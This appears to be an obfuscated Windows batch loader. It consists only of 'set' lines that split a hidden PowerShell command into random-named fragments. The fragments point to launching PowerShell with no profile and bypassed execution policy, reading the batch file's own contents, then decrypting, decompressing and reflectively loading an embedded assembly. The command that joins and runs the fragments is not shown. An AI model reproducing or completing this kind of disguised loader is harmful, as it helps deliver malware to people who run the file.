@echo off
set "wNOsJBbkKK=he"
set "ZPkLPJMPSQ=py"
set "uQLYJhkUwz=\v"
set "UrJizKPBHW=.e"
set "TOWaXRUoLe=ll"
set "bIyHQWkhqH=em"
set "tcuBWtGMvp=Po"
set "vjWozklBiU=ow"
set "AptbodzIAG=ll"
set "KWcAKXQEpc=xe"
set "buEGvrlWSf=co"
set "qmRAexOsFx=rS"
set "DAHBdGbPIC=po"
set "BpzjZODcoM=Sy"
set "qidysvbQDY=st"
set "NSKfTgVfMi=rs"
set "HjmvEQDiMP=\W"
set "qhNlgFHYhv=we"
set "LpkVqSQRsc=in"
set "FXfcjmjHCQ=Wi"
set "DRmCuPEBcJ=nd"
set "YbeVUxzJRQ= /"
set "DvLHdzArqm=do"
set "EngXSCebDF=1."
set "pTumhlxFre=we"
set "knUGlBpRDm=0\"
set "ZGGelMgNTr=s\"
set "KoBSqSwdda=ws"
set "GnEgnAKiJk=y "
set "JQILifKMpK=32"
set "RtqjVdGFTm=he"
set "GPEJCUKfiN=:\"
set "KmQcDLWbaD= C"
set "NkmEDlzSXr= %~dp0"
set "bnJPPfvYQE=cd"
set "LAdHTSJiOt=E = "
set "mZkxznrPZF=.-16"
set "XcWxdqZIAr=ytXH"
set "wfmxiIWAzD=Wyqo"
set "MOwiJcamPB=BC;$"
set "CFUzTZfHFU=[]] "
set "lXCvzmNvjH=6] -"
set "LuxCiQucFc=trea"
set "sWvACDTwuH=pStr"
set "lOXfSuwOzB=rans"
set "likkormeUj=OE, "
set "eyGspNhnri=Bmor"
set "doPlKJkZYO=tion"
set "enfKjUxuqL=comm"
set "mVVOSBdROA=XH);"
set "yZVKJBxdYH=('ev"
set "pPNYuEERXK=$FjY"
set "XowJRuzDDk=join"
set "wskOXaQfbU=pher"
set "TBDwzbFCaF=lsQm"
set "fTCxlLUgrx=hi.D"
set "jplKSeQVks=)) {"
set "OdVnurSEJx=iron"
set "ghESeelrGc=stem"
set "nKQfSQvtSd=etf."
set "umstUcKSrI=ptor"
set "dHBFjgDBLm=yste"
set "TVteKncTsc=16] "
set "HXOzZZovAI=[-1."
set "mOUWmnvuZs=ZytX"
set "lpGIzGwyAe=.Sec"
set "QSvLnnawKb=ss -"
set "zZaLVqfSrX=oArr"
set "qvzWADqwjn=urit"
set "CbtzVFxwDw=.Ass"
set "HYfowyoKVD=.Cry"
set "TMmrFddPDp=XOE."
set "hYDiSjXmkM=se()"
set "uNkRGuSONJ=rt]:"
set "DOvtUyNgZW=TllA"
set "xISVjseGBz= if "
set "JJPXNLzWDH=-4] "
set "BaElSuVeeA=.IO."
set "QuJEpLHIrB=grap"
set "owIRkligta=('%*'"
set "yGgMjtemfs=aDNK"
set "jpHjFLkNji=('%~f0'"
set "JvncolsIhp=S46e"
set "ArCHiYpxNd=] -j"
set "HfWbDOSDPw=Df);"
set "kqWUPOLfKd=);$Q"
set "jCMbeNfArl=tem."
set "pClJuzLPOZ=pose"
set "qjyBQoTIsj=H, 0"
set "DuiERATbMX=form"
set "vURjTWWleg=jYlG"
set "CiuHisOzPG=lG.I"
set "poLaYSYxRO=($TN"
set "JELMhnCKoc=$Zyt"
set "CMgrBTNxEc=Disp"
set "ymSqOevAdC=ert]"
set "PjgUxkYFLH=nage"
set "cyiMCHtvYR=[Sys"
set "AvQNfplXhn=-Obj"
set "trSjpggsYH=V = "
set "mfIpXhUaoG=pres"
set "vycbTxJYvg=sAT "
set "FIZgagoCFC=Hetf"
set "NUYzRvlyJt=FjYl"
set "YLbHVfPxUE=zm83"
set "qxMTpwKwEH== [S"
set "YTMiwSBIZl==');"
set "VmXxEYvIHV=y.Pa"
set "jvrRzgyvSc=FcNh"
set "sxmIJjLIso=Comp"
set "EFppgjoQmJ=embl"
set "pQtEgxpbeT=Df.T"
set "xVzncVbnwZ=-nop"
set "NOskhPeYIR=1] -"
set "hAoOFeWBXt=null"
set "tbTbSTkSLw=ddin"
set "MBJDvIcxFc=jYlG"
set "KZMBSvqeRA=$ppM"
set "reKsuVaqbu=y.Ci"
set "OMHQkhruft=oint"
set "nOLXWvvdhs=ring"
set "smNoKWtDnZ=ytXH"
set "IDDQeRmiEq=tS46"
set "DAOmUXORmO=bypa"
set "ZSAuzxgNfS=DNJS"
set "JQHwOBrrPg=CuSj"
set "mZAtVXtxPe=$lsQ"
set "gQjxzTkSfL=ect "
set "QHevGNPqYu=();$"
set "KegRHwSbYU=).Sp"
set "aGqprZQewe=join"
set "QfXWeZYCoj= = $"
set "cTeOdRcnwG=bjec"
set "dcTtSYWEIo=Conv"
set "XaZfvzSvWM=ion."
set "FXCgvyCksK=ress"
set "xMKjKDZBol=  $G"
set "pZQzHytuqe=rity"
set "HasUDTEubF=gnir"
set "dRwAPNTtwZ=Ype."
set "oxrEaHNZHk=cusr"
set "hOETzbWFkW=$Zyt"
set "iPpqsxckve=gMod"
set "rvPPUmSjIF=t Sy"
set "iihvXpPNBC= = ["
set "GGQxIApeRl=-joi"
set "LpjlYNdRFi=onve"
set "FyoAIqzmcU= = $"
set "qXGOlnQDcM=.Dis"
set "IsabQLYaGC=srA "
set "ULHTHsStHE=oin "
set "kSfXZzhqTe=ay()"
set "qiOEaaHDgz=pose"
set "GLaqpSSego=m.Re"
set "deVWNTNucH=e.Su"
set "FeHlSOoytn=vert"
set "ytMwtOraqL=lit("
set "mmDJgEZjcy=.Cre"
set "QsofOeNLOm=stem"
set "WPldpZCtEp=yTo("
set "AdbqDCdfti=);$F"
set "hitNFfWGeg=7;$F"
set "gxvbUckDQN=1..-"
set "DvqBuQDkQQ=ment"
set "SLqcavokEU=.Com"
set "PAERdCVupx=H = "
set "TwysftrQVu=.Cop"
set "EeXYyXtfUq=H = "
set "NTRdojzDAA=::De"
set "WwUJffAIra='')("
set "JGwHFiAVRu=rofi"
set "pyouePonvf=comp"
set "EHkasVolJY=y.Cr"
set "ExnfvJiNRV=ing("
set "dclVVymjqQ===')"
set "ChvHOUOzFk=ecry"
set "AgKrNsKWNI=flec"
set "BjVVTraejN=raph"
set "SixURqudca=mA ="
set "gABRfhKTxm=ode]"
set "QxQdfOKtSa=;$cu"
set "lCumCnSAOz=::('"
set "pBjMFcAJDt=New-"
set "UjwDQsMUan=nirt"
set "vVkzhIWwcX=8kuY"
set "HqOSylyvDs=)($Z"
set "TBHvOpugra='oPV"
set "MfMEYPdhLe=);$F"
